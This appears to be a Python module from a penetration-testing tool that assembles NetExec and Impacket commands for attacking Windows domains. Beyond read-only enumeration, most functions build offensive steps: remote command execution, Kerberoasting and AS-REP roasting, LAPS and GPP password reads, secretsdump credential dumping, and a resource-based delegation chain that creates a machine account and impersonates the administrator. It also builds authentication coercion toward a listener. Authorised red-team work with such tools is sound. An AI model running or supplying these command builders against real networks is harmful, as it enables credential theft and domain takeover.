"""Build NetExec/Impacket commands through the shell layer.

The enumeration checks stay read-only; the offensive builders behind an opt-in
flag produce exactly one command for the flag the operator passed. The only
strings that reach a child process are the argv built here."""

from __future__ import annotations

import os
import tempfile
from dataclasses import dataclass
from typing import List, Optional

from kitsune import tools
from kitsune.context import BackendInventory
from kitsune.model import CRED_PASSWORD, CRED_TICKET, Credential
from kitsune.shell import CommandSpec

IMPERSONATED_ACCOUNT = "administrator"


@dataclass
class SweepRequest:
    target: str
    dc_ip: Optional[str]
    domain: Optional[str]
    username: str
    credential: Credential
    local_auth: bool
    faketime: Optional[List[str]]

    def dc(self) -> str:
        """The host the DC-oriented checks address: --dc-ip when set, else the
        enumeration target."""
        return self.dc_ip if self.dc_ip else self.target


def pick_wrapper(inv: BackendInventory) -> Optional[tools.SweepTool]:
    for tool in tools.PROTOCOL_DRIVERS:
        if inv.has(tool.program):
            return tool
    return None


def _spec(program: str, timeout: float) -> CommandSpec:
    return CommandSpec(program=program, timeout=timeout)


def _domain_args(req: SweepRequest) -> List[str]:
    if req.local_auth:
        return ["--local-auth"]
    if req.domain:
        return ["-d", req.domain]
    return []


def _credential_args(cred: Credential) -> List[str]:
    kind = cred.kind()
    if kind == CRED_PASSWORD:
        return ["-p", cred.secret()]
    if kind == "ntlm hash":
        return ["-H", cred.secret()]
    if kind == "aes key":
        return ["--aesKey", cred.secret()]
    # ticket: -k --use-kcache reads from KRB5CCNAME (set via _credential_env).
    return ["-k", "--use-kcache"]


def _credential_env(cred: Credential):
    if cred.kind() == CRED_TICKET:
        return [("KRB5CCNAME", cred.ticket_path())]
    return []


def _password_of(cred: Credential) -> Optional[str]:
    return cred.password_value()


def _impacket_auth(req: SweepRequest, host: str) -> Optional[str]:
    pw = _password_of(req.credential)
    if pw is None:
        return None
    domain = "" if req.local_auth else (req.domain or "")
    return f"{domain}/{req.username}:{pw}@{host}"


def _with_common(spec: CommandSpec, req: SweepRequest) -> CommandSpec:
    spec.add_args(_domain_args(req))
    spec.add_args(_credential_args(req.credential))
    spec.set_envs(_credential_env(req.credential))
    return spec


def build_command(protocol: str, req: SweepRequest, tool: tools.SweepTool, timeout: float) -> CommandSpec:
    spec = _spec(tool.program, timeout).arg(protocol).arg(req.target).arg("-u").arg(req.username)
    _with_common(spec, req)
    if protocol == tools.Protocol.SMB:
        spec.add_args(["--shares", "--sessions", "--users", "--groups"])
    elif protocol == tools.Protocol.LDAP:
        spec.add_args(["--users", "--groups", "--computers", "--get-sid"])
    elif protocol == tools.Protocol.MSSQL:
        spec.arg("-q").arg("SELECT @@version")
    # winrm / wmi: nothing extra
    return spec


def build_exec(protocol: str, req: SweepRequest, tool: tools.SweepTool, cmd: str, powershell: bool, timeout: float) -> CommandSpec:
    spec = _spec(tool.program, timeout).arg(protocol).arg(req.target).arg("-u").arg(req.username)
    _with_common(spec, req)
    if powershell:
        return spec.arg("-X").arg(cmd)
    return spec.arg("-x").arg(cmd)


def build_getuserspns(req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    pw = _password_of(req.credential)
    if pw is None:
        return None
    user = f"{req.domain or ''}/{req.username}:{pw}"
    return _spec(tools.GET_USER_SPNS.program, timeout).arg(user).arg("-dc-ip").arg(req.dc())


def _ldap_command(tool: tools.SweepTool, req: SweepRequest, timeout: float, extra: List[str]) -> CommandSpec:
    spec = _spec(tool.program, timeout).arg("ldap").arg(req.dc()).arg("-u").arg(req.username)
    _with_common(spec, req)
    spec.add_args(extra)
    return spec


def asrep_outfile() -> str:
    return os.path.join(tempfile.gettempdir(), f"kitsune-asreproast-{os.getpid()}.hashes")


def build_asreproast(tool: tools.SweepTool, req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    return _ldap_command(tool, req, timeout, ["--asreproast", asrep_outfile()])


def build_laps(tool: tools.SweepTool, req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    return _ldap_command(tool, req, timeout, ["-M", "laps"])


def build_rbcd(tool: tools.SweepTool, req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    return _ldap_command(
        tool,
        req,
        timeout,
        [
            "--query",
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            "msDS-AllowedToActOnBehalfOfOtherIdentity",
        ],
    )


def build_kerberoast(req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    spec = build_getuserspns(req, timeout)
    if spec is None:
        return None
    return spec.arg("-request")


def build_dump(tool: tools.SweepTool, req: SweepRequest, timeout: float, flag: str) -> CommandSpec:
    spec = _spec(tool.program, timeout).arg("smb").arg(req.target).arg("-u").arg(req.username)
    _with_common(spec, req)
    return spec.arg(flag)


def build_secretsdump(req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    auth = _impacket_auth(req, req.target)
    if auth is None:
        return None
    return _spec(tools.SECRETSDUMP.program, timeout).arg(auth)


def build_getgpp(req: SweepRequest, timeout: float) -> Optional[CommandSpec]:
    auth = _impacket_auth(req, req.dc())
    if auth is None:
        return None
    return _spec(tools.GET_GPP_PASSWORD.program, timeout).arg(auth)


def build_addcomputer(req: SweepRequest, machine: str, machine_pass: str, timeout: float) -> Optional[CommandSpec]:
    auth = _impacket_auth(req, req.dc())
    if auth is None:
        return None
    return (
        _spec(tools.ADD_COMPUTER.program, timeout)
        .arg(auth)
        .arg("-dc-ip")
        .arg(req.dc())
        .arg("-computer-name")
        .arg(machine)
        .arg("-computer-pass")
        .arg(machine_pass)
    )


def build_rbcd_write(req: SweepRequest, machine: str, delegate_to: str, timeout: float) -> Optional[CommandSpec]:
    auth = _impacket_auth(req, req.dc())
    if auth is None:
        return None
    return (
        _spec(tools.RBCD.program, timeout)
        .arg("-delegate-from")
        .arg(machine)
        .arg("-delegate-to")
        .arg(delegate_to)
        .arg("-dc-ip")
        .arg(req.dc())
        .arg("-action")
        .arg("write")
        .arg(auth)
    )


def build_getst(req: SweepRequest, machine: str, machine_pass: str, spn: str, impersonate: str, ccache: str, timeout: float) -> CommandSpec:
    auth = f"{req.domain or ''}/{machine}:{machine_pass}@{req.dc()}"
    return (
        _spec(tools.GET_ST.program, timeout)
        .arg("-spn")
        .arg(spn)
        .arg("-impersonate")
        .arg(impersonate)
        .arg("-dc-ip")
        .arg(req.dc())
        .arg("-outputfile")
        .arg(ccache)
        .arg(auth)
    )


def _computer_name(account: str) -> str:
    return account[:-1] if account.endswith("$") else account


def default_getst_spn(delegate_to: str) -> str:
    return f"cifs/{_computer_name(delegate_to)}"


def build_coerce(req: SweepRequest, listener: str, timeout: float) -> Optional[CommandSpec]:
    pw = _password_of(req.credential)
    if pw is None:
        return None
    spec = (
        _spec(tools.COERCER.program, timeout)
        .arg("coerce")
        .arg("-t")
        .arg(req.target)
        .arg("-l")
        .arg(listener)
        .arg("-u")
        .arg(req.username)
        .arg("-p")
        .arg(pw)
    )
    if req.domain:
        spec.arg("-d").arg(req.domain)
    return spec
